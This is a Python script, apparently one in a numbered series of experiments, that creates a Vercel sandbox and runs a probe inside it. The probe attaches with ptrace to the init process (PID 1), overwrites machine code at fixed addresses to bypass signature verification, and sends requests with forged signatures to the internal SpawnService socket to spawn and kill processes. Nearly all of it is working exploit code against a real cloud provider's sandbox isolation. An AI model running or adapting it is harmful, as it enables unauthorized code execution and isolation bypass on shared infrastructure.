# 实验J76: SpawnService Ping/Kill 方法语义 (免签名)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj76"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, re, struct, subprocess, ctypes, socket, base64, time, json

# 1) patch 签名 (j61 配置)
def ptrace_rw(addr, data):
    libc2 = ctypes.CDLL("libc.so.6", use_errno=True)
    libc2.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
    libc2.ptrace.restype = ctypes.c_long
    libc2.waitpid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
    libc2.waitpid.restype = ctypes.c_int
    libc2.ptrace(16, 1, None, None)
    if libc2.waitpid(1, None, 0) != 1:
        libc2.ptrace(17, 1, None, None)
        return 0, 0
    ok = 0
    total = (len(data) + 7) // 8
    for off in range(0, len(data), 8):
        word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
        if libc2.ptrace(5, 1, addr + off, word) == 0:
            ok += 1
    libc2.ptrace(17, 1, None, None)
    return ok, total

PATCH_A = bytes.fromhex("31c031db4881c4d00000005dc3")
PATCH_B = bytes.fromhex("31c031db4881c4900000005dc3")
for va in [0x83b571, 0x83b5af]:
    print("patch A@%s: %s" % (hex(va), ptrace_rw(va, PATCH_A)), flush=True)
print("patch B: %s" % (ptrace_rw(0x82a9f9, PATCH_B),), flush=True)

def sigcall(path, body=b"{}", ctype="application/connect+json", timeout=8):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: " + ctype,
           "-H", "Connect-Protocol-Version: 1",
           "-H", "x-timestamp: " + str(int(time.time() * 1000)),
           "-H", "x-signature: " + base64.b64encode(b"\x99" * 64).decode(),
           "--data-binary", "@-", "http://localhost" + path]
    try:
        r = subprocess.run(cmd, input=body, capture_output=True, timeout=timeout + 2)
        return r.stdout.decode("latin1", "replace")
    except Exception as e:
        return "EXC " + str(e)

def ev(out):
    # 提取 body 部分
    idx = out.find("\r\n\r\n")
    body = out[idx+4:] if idx >= 0 else out
    return body.replace("\r\n", " | ")[:400]

print("== [1] Ping 各种 body ==", flush=True)
for body, tag in [(b"{}", "empty-obj"), (b"", "empty"), (b'{"value":"ping"}', "ping-val")]:
    out = sigcall("/vercel.sandbox.spawn.v1.SpawnService/Ping", body)
    print("[Ping %s] %s" % (tag, ev(out)), flush=True)

print("== [2] Ping proto 格式 ==", flush=True)
# connect proto: 1B flag + BE32 len + payload
proto_body = b"\x00" + struct.pack(">I", 0)
out = sigcall("/vercel.sandbox.spawn.v1.SpawnService/Ping", proto_body, "application/connect+proto")
print("[Ping proto] %s" % ev(out), flush=True)

print("== [3] Spawn 一个 sleep 进程, 然后 Kill ==", flush=True)
req = json.dumps({"command": "sleep", "arguments": ["60"]}).encode()
env_body = b"\x00" + struct.pack(">I", len(req)) + req
out = sigcall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", env_body)
print("[Spawn sleep] %s" % ev(out), flush=True)
pid = None
m = re.search(r'"processId":"(proc_\d+)"', out)
if m:
    pid = m.group(1)
    print("spawned:", pid, flush=True)
    # Kill 它
    kreq = json.dumps({"processId": pid}).encode()
    kbody = b"\x00" + struct.pack(">I", len(kreq)) + kreq
    out2 = sigcall("/vercel.sandbox.spawn.v1.SpawnService/Kill", kbody)
    print("[Kill %s] %s" % (pid, ev(out2)), flush=True)
    # 验证进程死了: ps 看
    time.sleep(0.5)
    p = subprocess.run(["ps", "aux"], capture_output=True, text=True)
    print("ps after kill:", p.stdout[:400], flush=True)

print("== [4] 空 body Spawn / 畸形 body 错误信息 (API 面) ==", flush=True)
for body, tag in [(b"", "empty"), (b"\x00\x00\x00\x00\x01", "bad-len"), (b"\x00" + struct.pack(">I", 99999) + b"\xff"*10, "huge-len")]:
    out = sigcall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", body)
    print("[Spawn %s] %s" % (tag, ev(out)), flush=True)

print("== [5] Ping 免签名 (未 patch 的对照: 应该 invalid signature) ==", flush=True)
# 用一个独立沙箱的对照会更好, 这里直接看当前 patch 状态下 Ping 是否也要签名
out = sigcall("/vercel.sandbox.spawn.v1.SpawnService/Ping", b"{}")
print("[Ping now] %s" % ev(out), flush=True)
"""
run_cmd(sid, PROBE, "ping-kill", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
